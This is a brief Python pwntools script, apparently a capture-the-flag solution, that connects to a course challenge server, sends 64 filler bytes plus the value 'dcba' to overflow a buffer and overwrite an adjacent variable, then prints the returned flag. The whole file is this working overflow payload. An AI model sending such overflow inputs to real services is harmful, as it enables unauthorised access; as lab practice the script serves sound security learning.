from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt" 
PORT = 25152

s = remote(SERVER, PORT, timeout=9999)

s.recv(512)
s.sendline(b'1' * 64 + b'dcba')
time.sleep(1)
flag = s.recv(512).decode()
print(flag)
